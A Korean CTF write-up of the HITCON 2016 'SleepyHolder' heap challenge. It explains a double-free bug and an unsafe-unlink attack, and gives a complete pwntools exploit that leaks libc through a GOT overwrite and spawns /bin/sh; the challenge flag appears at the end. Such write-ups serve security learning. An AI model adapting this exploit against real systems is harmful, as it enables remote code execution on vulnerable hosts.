---
layout: post
title: "[2016 hitcon-ctf] SleepyHolder 풀이"
date: 2018-09-13 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### The Secret Holder has become sleepy and lazy now. nc 52.68.31.117 9547
### [Sleepy Holder](https://github.com/ctfs/write-ups-2016/raw/master/hitcon-ctf-2016/pwn/sleepy-holder-300/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015)

[how2heap](https://github.com/shellphish/how2heap)의 `fastbin dup consolidate` 문제에요.

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2016_hitcon-ctf/SleepyHolder/01.png)
{: refdef}

`small_secret`, `big_secret`, `huge_secret` 이렇게 세 개의 크기로 `chunk`를 할당받을 수 있는데 `huge_secret`은 할당만 받을 수 있고 `func_wipe`, `func_renew`에선 사용할 수 없어여.

그리고 `bss`영역에 `chunk`의 존재 유무를 판단하는 `flag`가 존재하고 `chunk`의 주소도 존재해요.

## `func_keep`

1. `small`, `big`, `huge` 선택

2. 해당 크기의 `flag` 값이 `0`이면 `chunk`가 없다고 판단하고 `calloc` (`0x28`, `0xfa0`, `0x61a80`)

3. (`0x28`, `0xfa0`, `0x61a80`) 만큼 `read`

## `func_wipe`

1. `small`, `big` 선택

2. `flag` 값과 상관없이 `free(chunk)`

3. `flag` 값을 `0`으로 바꿈

## `func_renew`

1. `small`, `big` 선택

2. `flag` 값이 존재하면 (`0x28`, `0xfa0`) 만큼 `read`

- - -
# 0x01. 취약점 분석

`func_wipe`에서 `flag`를 검사 안 해서 취약점이 발생해요.

`fastbin` 크기라도 `free`된 상태에서 `큰 chunk`를 할당하면 `unsorted_bin`이 돼요.

그러면 `big_secret` 기준에선 자기 앞에 있던 `chunk`가 `free`돼서 `prev_inuse` 값이` 0`으로 바뀌어요. (`0xfb1` -> `0xfb0`)

```python
func_keep(1, "A")
func_keep(2, "B")
func_wipe(1)

func_keep(3, "C")
func_wipe(1)
```

{: refdef: style="text-align: center;"}
![func_wipe(1)](/img/2016_hitcon-ctf/SleepyHolder/02.png)
{: refdef}

`small_secret`을 `free`하고 `huge_secret`을 할당받기 전 모습이에요.

{: refdef: style="text-align: center;"}
![func_keep(3)](/img/2016_hitcon-ctf/SleepyHolder/03.png)
{: refdef}

`huge_secret`을 할당받고 `small_secret`을 다시 `free`해서 `small_secret`의 `fd` 값이 없어졌어요.

- - -
# 0x02. 공격 방법

`small_secret`을 한 번 더 `free`해준 이후에 `small_secret`을 새로 할당해도 `big_secret`의 `prev_inuse` 값은 그대로라서 `big_secret`을 `free`하면 `unsafe_unlink`를 사용할 수 있어요.

`small_secret`안에 `fake_chunk`를 만들고 `big_secret`의 `prev_size`를 `0x20`으로 조작하면 `big_secret`이 `free`되면서 `prev_inuse`가 `0`인걸 보고 `big_secret - prev_size - 0x10`에서 `unlink`가 실행돼요.

`big_chunk`의 `prev_size`가 `0x30`에서 `0x20`으로 바뀌어서 `fake_chunk`의 `fd`, `bk`를 가지고 `unlink`가 실행돼여.

```python
func_keep(1, "A")
func_keep(2, "B")
func_wipe(1)

func_keep(3, "C")
func_wipe(1)

payload = p64(0x0) # fake_chunk -> prev_size
payload += p64(0x20) # fake_chunk -> size
payload += p64(small_secret - 0x18) # fake_chunk -> fd
payload += p64(small_secret - 0x10) # fake_chunk -> bk
payload += p64(0x20) # big_secret -> prev_size
func_keep(1, payload)
func_wipe(2)
```

`func_wipe(2)`가 실행되면 `fake_chunk`의 `fd`의 `bk`는 `fake_chunk`의 `bk`로 바뀌어요. `fake_chunk`의 `fd`는 `small_secret`의 주소가 있는 전역변수 - `0x18`에요.

즉, 전역변수 부분에 `fake_chunk`의 `bk`가 들어가요. 그리고 `fake_chunk`의 `bk`의 `fd`가 `fake_chunk`의 `fd`로 바뀌는데 결과적으론 전역변수 부분에 `fake_chunk`의 `fd`가 들어가요.

`unlink`가 끝나면 전역변수 부분엔 `자신의 주소 - 0x18`가 들어있어요.

전역변수는 원래 `small_secret`의 주소가 들어있으니까 지금 `func_renew`를 하면 `전역변수 - 0x18`부터 원하는 값을 넣을 수 있고 그러면 `small_secret`, `big_secret`을 원하는 걸로 바꿀 수 있어요.

- - -
# 0x03. 익스플로잇

처음 풀 땐 `unsafe_unlink` 때문에 고생했는디 다시 푸니까 쉽네요.

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "52.68.31.117"
PORT = 4444
#PORT = 9547

s = remote(HOST, PORT)
pause()

elf = ELF("./SleepyHolder")
libc = ELF("./libc.so.6")

free_got = elf.got["free"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]

small_secret = 0x6020D0

def func_keep(size, content):
    s.recvuntil("3. Renew secret\n")
    s.sendline("1")

    s.recvuntil("2. Big secret\n")
    s.sendline(str(size))

    s.recvuntil("Tell me your secret: \n")
    s.send(content)

def func_wipe(size):
    s.recvuntil("3. Renew secret\n")
    s.sendline("2")

    s.recvuntil("2. Big secret\n")
    s.sendline(str(size))

def func_renew(size, content):
    s.recvuntil("3. Renew secret\n")
    s.sendline("3")

    s.recvuntil("2. Big secret\n")
    s.sendline(str(size))

    s.recvuntil("Tell me your secret: \n")
    s.send(content)

func_keep(1, "A")
func_keep(2, "B")
func_wipe(1)

func_keep(3, "C")
func_wipe(1)

payload = p64(0x0) # fake_chunk -> prev_size
payload += p64(0x20) # fake_chunk -> size
payload += p64(small_secret - 0x18) # fake_chunk -> fd
payload += p64(small_secret - 0x10) # fake_chunk -> bk
payload += p64(0x20) # big_secret -> prev_size
func_keep(1, payload)
func_wipe(2)

payload = "A"*0x8
payload += p64(puts_got) # big_secret
payload += "A"*0x8 # huge_secret
payload += p64(free_got) # small_secret
payload += p64(0x1) # big_flag
func_renew(1, payload)
func_renew(1, p64(puts_plt)) # free_got -> puts_plt -> puts_got -> puts

func_wipe(2) # libc_leak
real_puts = u64(s.recvuntil("\x7f").ljust(8, "\x00"))

real_base = real_puts - puts_off
real_system = real_base + system_off

print
log.info("real_base : " + hex(real_base))
log.info("real_puts : " + hex(real_puts))
log.info("real_system : " + hex(real_system))
print

func_renew(1, p64(real_system)) # free_got -> real_system

func_keep(2, "/bin/sh\0")
func_wipe(2)

s.interactive()
```

### hitcon{The Huuuuuuuuuuuge Secret Really MALLOC a difference!}
